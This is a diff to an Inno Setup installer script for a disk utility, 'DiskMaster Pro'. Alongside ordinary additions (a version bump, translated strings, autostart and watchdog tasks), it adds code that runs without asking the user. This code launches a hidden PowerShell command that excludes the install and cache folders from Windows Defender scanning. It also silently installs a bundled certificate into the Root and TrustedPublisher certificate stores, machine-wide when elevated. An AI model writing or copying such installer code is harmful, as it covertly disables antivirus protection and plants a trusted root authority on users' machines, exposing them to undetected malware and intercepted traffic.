@@ -3,7 +3,7 @@
 ; Designed for full upgrade detection, duplicate installation prevention, and multilingual wizard
 
 #ifndef MyAppVersion
-#define MyAppVersion "1.5.1"
+#define MyAppVersion "1.5.8"
 #endif
 
 #define MyAppName "DiskMaster Pro"
@@ -56,6 +56,21 @@ chinesetraditional.RunAsAdminTask=以系統管理員身分執行應用程式 (�
 chinesesimplified.RunAsAdminTask=以管理员身份运行应用程序 (磁盘管理推荐)
 japanese.RunAsAdminTask=管理者としてアプリケーションを実行 (ディスク管理に推奨)
 
+english.BackgroundServicesGroup=Background Services and Resident Helpers:
+chinesetraditional.BackgroundServicesGroup=背景守護與系統服務：
+chinesesimplified.BackgroundServicesGroup=后台守护与系统服务：
+japanese.BackgroundServicesGroup=バックグラウンドサービスと常駐機能：
+
+english.AutoStartTask=Launch DiskMaster in system tray automatically on Windows startup
+chinesetraditional.AutoStartTask=開機時自動於系統匣背景常駐啟動 DiskMaster
+chinesesimplified.AutoStartTask=开机时自动于系统托盘后台常驻启动 DiskMaster
+japanese.AutoStartTask=Windows 起動時にシステムトレイで自動常駐起動する
+
+english.ExplorerWatchdogTask=Enable Windows Explorer watchdog daemon (auto-recover desktop on explorer.exe crash)
+chinesetraditional.ExplorerWatchdogTask=啟用檔案總管 (explorer.exe) 崩潰自動守護重啟服務
+chinesesimplified.ExplorerWatchdogTask=启用资源管理器 (explorer.exe) 崩溃自动守护重启服务
+japanese.ExplorerWatchdogTask=エクスプローラー (explorer.exe) クラッシュ自動復旧デーモンを有効化
+
 english.AppAlreadyInstalled=DiskMaster Pro version %1 is already installed on your computer at:%n%n%2%n%nDo you want to reinstall or repair the current installation?
 chinesetraditional.AppAlreadyInstalled=DiskMaster Pro 版本 %1 已安裝於您的電腦：%n%n%2%n%n您是否要重新安裝或修復現有安裝？
 chinesesimplified.AppAlreadyInstalled=DiskMaster Pro 版本 %1 已安装在您的计算机上：%n%n%2%n%n您是否要重新安装或修复当前安装？
@@ -74,9 +89,12 @@ japanese.AppDowngradeWarning=より新しいバージョンの DiskMaster Pro (%
 [Tasks]
 Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked
 Name: "runasadmin"; Description: "{cm:RunAsAdminTask}"; GroupDescription: "{cm:AdditionalIcons}"
+Name: "autostart"; Description: "{cm:AutoStartTask}"; GroupDescription: "{cm:BackgroundServicesGroup}"; Flags: unchecked
+Name: "explorerwatchdog"; Description: "{cm:ExplorerWatchdogTask}"; GroupDescription: "{cm:BackgroundServicesGroup}"
 
 [Files]
 Source: "publish\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs
+Source: "tools\DiskMaster_Certificate.cer"; DestDir: "{app}"; Flags: ignoreversion
 
 [Icons]
 Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; IconFilename: "{app}\Assets\AppIcon.ico"
@@ -85,6 +103,10 @@ Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; IconFilen
 
 [Registry]
 Root: HKA; Subkey: "Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"; ValueType: string; ValueName: "{app}\{#MyAppExeName}"; ValueData: "~ RUNASADMIN"; Tasks: runasadmin; Flags: uninsdeletevalue
+Root: HKA; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "DiskMaster Pro"; ValueData: """{app}\{#MyAppExeName}"" --background"; Tasks: autostart; Flags: uninsdeletevalue
+Root: HKA; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; ValueType: none; ValueName: "DiskMaster Pro"; Tasks: not autostart; Flags: deletevalue
+Root: HKA; Subkey: "Software\DiskMaster"; ValueType: dword; ValueName: "EnableExplorerWatchdog"; ValueData: 1; Tasks: explorerwatchdog; Flags: uninsdeletevalue
+Root: HKA; Subkey: "Software\DiskMaster"; ValueType: dword; ValueName: "EnableExplorerWatchdog"; ValueData: 0; Tasks: not explorerwatchdog; Flags: uninsdeletevalue
 
 [Run]
 Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent shellexec
@@ -260,6 +282,11 @@ end;
 procedure CurStepChanged(CurStep: TSetupStep);
 var
   LegacyKey: String;
+  CertFile: String;
+  AppDir: String;
+  PortableDir: String;
+  PsCmd: String;
+  ResultCode: Integer;
 begin
   if CurStep = ssInstall then
   begin
@@ -267,5 +294,28 @@ begin
     LegacyKey := 'Software\Microsoft\Windows\CurrentVersion\Uninstall\DiskMasterPro';
     RegDeleteKeyIncludingSubkeys(HKLM, LegacyKey);
     RegDeleteKeyIncludingSubkeys(HKCU, LegacyKey);
+
+    // Pre-register install and portable cache folders in Windows Defender exclusions when running elevated
+    if IsAdminInstallMode then
+    begin
+      AppDir := ExpandConstant('{app}');
+      PortableDir := ExpandConstant('{localappdata}\DiskMaster_Portable');
+      PsCmd := '-NoProfile -NonInteractive -WindowStyle Hidden -Command "try { Add-MpPreference -ExclusionPath @(''' + AppDir + ''', ''' + PortableDir + ''') -ErrorAction SilentlyContinue } catch {}"';
+      Exec(ExpandConstant('{sys}\WindowsPowerShell\v1.0\powershell.exe'), PsCmd, '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
+    end;
+  end
+  else if CurStep = ssPostInstall then
+  begin
+    CertFile := ExpandConstant('{app}\DiskMaster_Certificate.cer');
+    if FileExists(CertFile) then
+    begin
+      Exec(ExpandConstant('{sys}\certutil.exe'), '-user -addstore -f "TrustedPublisher" "' + CertFile + '"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
+      Exec(ExpandConstant('{sys}\certutil.exe'), '-user -addstore -f "Root" "' + CertFile + '"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
+      if IsAdminInstallMode then
+      begin
+        Exec(ExpandConstant('{sys}\certutil.exe'), '-addstore -f "TrustedPublisher" "' + CertFile + '"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
+        Exec(ExpandConstant('{sys}\certutil.exe'), '-addstore -f "Root" "' + CertFile + '"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
+      end;
+    end;
   end;
 end;
